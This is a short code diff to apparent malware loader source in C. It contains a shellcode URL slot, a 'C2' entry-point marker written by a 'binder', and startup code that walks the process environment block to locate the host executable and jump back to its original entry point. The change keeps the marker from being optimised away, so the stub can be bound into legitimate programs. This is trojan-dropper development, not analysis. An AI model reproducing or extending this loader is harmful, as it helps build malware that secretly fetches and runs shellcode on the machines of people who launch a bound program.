@@ -47,7 +47,7 @@ typedef unsigned short u16;
 /* ── Patched data (ASCII-findable by LoaderUrlPatcher) ─────────────────────── */
 
 static char g_url[256] = "SHELLCODE_URL_PLACEHOLDER";
-static char c2_oep[12] = "C2OEPRAV";   /* 8-byte marker + 4-byte OEP RVA slot (binder writes offset 8) */
+static volatile char c2_oep[12] = "C2OEPRAV";   /* volatile: prevent the -O2 constant-fold that erased this marker */
 
 /* ── API function-pointer types ───────────────────────────────────────────── */
 
@@ -159,7 +159,7 @@ void _start(void)
     uptr ldr   = *(uptr *)(peb + LDR_OFF);
     uptr first = *(uptr *)(ldr + INLOAD_OFF);
     uptr base  = *(uptr *)(first + DBASE_INLOAD);
-    u32 oep    = *(u32 *)(c2_oep + 8);   /* original entry-point RVA (patched by binder) */
+    u32 oep    = *(volatile u32 *)(c2_oep + 8);   /* original entry-point RVA (patched by binder) */
     ((void (*)(void))(base + oep))();
 
     for (;;) {}   /* never reached for an EXE entry */
